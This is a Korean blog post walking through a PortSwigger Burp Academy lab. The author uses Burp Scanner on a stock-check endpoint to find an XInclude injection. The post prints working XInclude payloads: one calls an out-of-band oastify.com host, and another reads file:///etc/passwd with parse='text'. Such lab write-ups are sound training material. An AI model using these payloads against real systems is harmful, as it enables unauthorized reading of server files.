---
layout: post
title: "Burp Academy-필수스킬: Discovering vulnerabilities quickly with targeted scanning"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Essential Skills]
toc: true
last_modified_at: 2024-12-10 09:33:00 +0900
---

# 개요
- 랩을 푸는데 있어서 필수적인 스킬을 배운다. 
- 문제 주소: https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning
- 취약점 설명페이지: https://portswigger.net/web-security/essential-skills
- 난이도: PRACTITIONER (보통)


# 문제 개요
- 이 랩은 서버의 임의의 파일을 읽을 수 있는 취약점을 포함하고 있다. 
- 랩을 풀러면 /etc/passwd의 컨텐츠를 10분 이내에 얻어내라. 
- 시간제한이 있으므로 Burp Scanner 를 사용하는 것을 추천한다. 사이트 전체를 스캔하는 것은 시간이 걸리므로, 당신의 직관을 사용해서 취약한 엔드포인트를 식별하고, 그 엔드포인트에 대해 특정 요청을 보낸다. Burp가 공격가능한 취약점(attack vector)을 찾아주면, 스스로 exploit할 수 있는 방법을 찾으라. 

```
This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of /etc/passwd within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a targeted scan on a specific request. Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.
```

# 풀이
1. 랩을 살펴보니 `POST /product/stock` 엔드포인트가 있었다. 의심스러우므로 여기를 대상으로 모든 체크를 돌려봤다. HTTP 요청 탭에서 마우스 오른쪽 버튼을 누르고 스캔메뉴를 선택해서 스캔을 실시한다. 

2. 결과는 다음과 같았다. `Out-of-band resource load(HTTP)` 취약점을 발견해주었다. 

![](/images/burp-academy-essential-1-3.png)

페이로드를 디코딩해보면 다음과 같다. href에 지정된 URL로 접속이 발생했다는 지적이다. 

```xml
<hmi xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://kaysdz7n2jb6pw6it6gwlgdolfr9fz30rsei27.oastify.com/foo"/></hmi>
```

3. 페이로드를 다음과 같이 변경해본다. XXE 인젝션 랩에서 몇번 사용했었다. 

```xml
<hmi xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></hmi>
```

4. 그런데 테스트해보면  다음과 같이 `Content is not allowed in prolog` 라는 에러를 돌려준다. 구글링해보면 XML을 import/export 할 때 인코딩이 맞지 않을 때 발생하는 에러라는 것을 알 수 있다. 

![](/images/burp-academy-essential-1-1.png)


5. 페이로드의 inlcude 부분에 parse="text" 를 추가한다. 이러헥 하면 XML이 아니라 text로 인식하는 것 같다. 이렇게 하면 /etc/passwd 파일의 내용을 돌려준다. 

```xml
<hmi xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></hmi>
```

![](/images/burp-academy-essential-1-2.png)

6. 랩이 풀렸다. 

![](/images/burp-academy-essential-1-success.png)


# 정리
이번 랩에는 10분이라는 시간제한이 있었다. 시간 내에 풀기 위해서는 취약해 보이는 엔드포인트를 골라서 이 엔드포인트에만 스캔을 실시할 필요가 있었다. 이 테크닉은 앞으로도 자주 쓰이므로 확실히 기억해두자. 